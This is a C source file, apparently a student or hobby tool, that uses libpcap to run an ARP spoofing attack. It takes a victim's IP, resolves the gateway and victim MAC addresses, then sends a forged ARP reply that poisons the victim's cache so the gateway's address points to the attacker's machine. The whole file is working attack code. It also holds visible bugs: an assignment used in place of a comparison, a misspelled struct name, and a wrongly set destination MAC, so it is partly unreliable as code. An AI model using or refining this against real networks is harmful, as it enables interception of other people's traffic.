#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap/pcap.h>   
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h> 
#include <netinet/ether.h> 

int main(int argc, char *argv[])
{
	pcap_t *handle;
	char *dev;  
 	char errbuf[PCAP_ERRBUF_SIZE]; 
 	struct pcap_pkthdr *header; 
	const u_char *packet; 
	int result;
	
	int i=0;
	char vtip[100];
	char myip[100];
	char gwip[100];
	char mymac[100];
	char gwmac[100];
	char mymac1[100];
	char myip1[100];
	char gwip1[100];
	char gwmac1[100];
	char vtip1[100];
	char vtmac1[100];
	ether_header * ethernet1;
	ether_header * ethernet2;
	struct ether_arp * arp1;
	ether_arp * arp2;
	
	dev = pcap_lookupdev(errbuf);
	if(dev==NULL) 
 	{ 
		printf("Couldn't find device:%s \n", errbuf); 
 		return(2); 
 	} 



	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

 
 	if (handle == NULL)  
	{ 
 		printf("Couldn't open device %s: %s\n", dev, errbuf); 
		return(2); 
	} 
 		

	//get victim ip

	scanf("%s",vtip);

	//get my ip

	FILE *p1 = popen("ifconfig|grep 'inet addr'|grep Bcast|awk '{print $2}'|awk -F ':' '{print $2}'", "r");
	if(p1 != NULL) {
		 while(fgets(myip, sizeof(myip), p1) != NULL);
 		printf("my ip:%s\n",myip);
	}

	//get my mac

	FILE *p2 = popen("ifconfig|grep HW|awk '{print $5}'", "r");
	if(p2 != NULL) {
 		while(fgets(mymac, sizeof(mymac), p2) != NULL);
 		printf("my mac:%s\n",mymac);

	}


	//get gateway ip

	FILE *p3 = popen("netstat -rn|grep 'UG'|awk '{print $2}'", "r");
	if(p3 != NULL) {
		 while(fgets(gwip, sizeof(gwip), p3) != NULL);
 		printf("gateway ip:%s\n",gwip);
	}


	ether_aton_r(mymac, (ether_addr*)mymac1);
	inet_aton(myip, (in_addr *)myip1);
	inet_aton(gwip, (in_addr *)gwip1);
	inet_aton(vtip, (in_addr *)vtip1);

	
	//arp request to gateway
	struct ether_header *ethhdr_arp2gw;
	struct ether_arp *arp_arp2gw;
	char sendpacket1[sizeof(ether_header)+sizeof(ether_arp)];

	ethhdr_arp2gw = (ether_header *)malloc(sizeof(ether_header));
	arp_arp2gw = (ether_arp *)malloc(sizeof(ether_arp));

	memcpy(&ethhdr_arp2gw->ether_shost,mymac1, 6);
	for(i=0;i<6;i++)
		ethhdr_arp2gw->ether_dhost[i]=0xff;
	ethhdr_arp2gw->ether_type=htons(ETHERTYPE_ARP);

	memcpy(sendpacket1, ethhdr_arp2gw, 14);

	arp_arp2gw->arp_hrd=htons(0x0001); 
	arp_arp2gw->arp_pro=htons(0x0800); 
	arp_arp2gw->arp_hln=0x06;
	arp_arp2gw->arp_pln=0x04;
	arp_arp2gw->arp_op=htons(0x0001);
	memcpy(&arp_arp2gw->arp_sha,mymac1, 6);
	memcpy(&arp_arp2gw->arp_spa,myip1, 4);
	for(i=0;i<6;i++)
		arp_arp2gw->arp_tha[i]=0x00;
	memcpy(&arp_arp2gw->arp_tpa,gwip1, 4);
	memcpy(sendpacket1+14,arp_arp2gw,sizeof(ether_arp));
	
	
		
	while(1) 
	{
		pcap_sendpacket(handle,(const u_char*)sendpacket1,sizeof(ether_header)+sizeof(ether_arp));
	
		result = pcap_next_ex(handle, &header,&packet);
		if(result =1)
		{
				
			ethernet1=(ether_header *) packet;
	
			if(ntohs(ethernet1-> ether_type) != 0x0806)
			{
				continue;
			}
			else
			{
				
				arp1=(ether_arp *)(packet+sizeof(struct ether_header));
			
				if(memcmp(arp1->arp_spa,gwip1, 4)==0)
				{	
					printf("2\n");
					memcpy(gwmac1, &arp1->arp_sha,6);
					printf("get reply from gateway\n");
					break;
				}
				continue;
			}
		}
		
	}
	
	//arp request to victim
	struct ether_header *ethhdr_arp2vt;
	struct ether_arp *arp_arp2vt;
	char sendpacket2[sizeof(ether_header)+sizeof(ether_arp)];

	ethhdr_arp2vt = (ether_header *)malloc(sizeof(ether_header));
	arp_arp2vt = (ether_arp *)malloc(sizeof(ether_arp));

	memcpy(&ethhdr_arp2vt->ether_shost,mymac1,  6);
	for(i=0;i<6;i++)
		ethhdr_arp2vt->ether_dhost[i]=0xff;
	ethhdr_arp2vt->ether_type=htons(ETHERTYPE_ARP);

	memcpy(sendpacket2, ethhdr_arp2gw, 14);

	arp_arp2vt->arp_hrd=htons(0x0001); 
	arp_arp2vt->arp_pro=htons(0x0800); 
	arp_arp2vt->arp_hln=0x06;
	arp_arp2vt->arp_pln=0x04;
	arp_arp2vt->arp_op=htons(0x0001);
	memcpy(&arp_arp2vt->arp_sha,mymac1, 6);
	memcpy(&arp_arp2vt->arp_spa,myip1, 4);
	for(i=0;i<6;i++)
		arp_arp2vt->arp_tha[i]=0x00;
	memcpy(&arp_arp2vt->arp_tpa,vtip1, 4);

	memcpy(sendpacket2+14,arp_arp2vt,sizeof(ether_arp));

	pcap_sendpacket(handle,(const u_char*)sendpacket2,sizeof(ether_header)+sizeof(ether_arp));
	
	//send packet
	

	while(1) 
	{
		printf("1\n");
		pcap_sendpacket(handle,(const u_char*)sendpacket2,sizeof(ether_header)+sizeof(ether_arp));
		result = pcap_next_ex(handle, &header,&packet);
		if(result =1)
		{
			ethernet2=(ether_header *) packet;
			if(ntohs(ethernet2-> ether_type) != 0x0806)
			{
				continue;
			}
			else
			{
				arp2=(ether_arp *)(packet+sizeof(struct ether_header));
				if(memcmp(&arp2->arp_spa,vtip1, 4)==0)
				{
					memcpy(vtmac1, &arp2->arp_sha,6);
					printf("get reply from victim\n");
					break;
				}
				continue;
			}
		}
	}
	


//get packet

//fake arp reply

	struct ether_heayjder *ethhdr_reply2vt;
	struct ether_arp *arp_reply2vt;
	ethhdr_reply2vt = (ether_header *)malloc(sizeof(ether_header));
	arp_reply2vt = (ether_arp *)malloc(sizeof(ether_arp));

	char sendpacket3[sizeof(ether_header)+sizeof(ether_arp)];

	memcpy(&ethhdr_reply2vt->ether_shost, mymac1, 6);
	memcpy(&ethhdr_reply2vt->ether_shost, vtmac1, 6);
	ethhdr_reply2vt->ether_type=htons(ETHERTYPE_ARP);

	memcpy(sendpacket3, ethhdr_reply2vt, 14);

	arp_reply2vt->arp_hrd=htons(0x0001); 
	arp_reply2vt->arp_pro=htons(0x0800); 
	arp_reply2vt->arp_hln=0x06;
	arp_reply2vt->arp_pln=0x04;
	arp_reply2vt->arp_op=htons(0x0002);
	memcpy(&arp_reply2vt->arp_sha,mymac1,6);
	memcpy(&arp_reply2vt->arp_spa,gwip1, 4);
	memcpy(&arp_reply2vt->arp_tha,vtmac1,6);
	memcpy(&arp_reply2vt->arp_tpa,vtip1, 4);

	memcpy(sendpacket3+14,arp_reply2vt,sizeof(ether_arp));

	pcap_sendpacket(handle,(const u_char*)sendpacket3,sizeof(sendpacket3));

	pcap_close(handle);

    return 0;
}


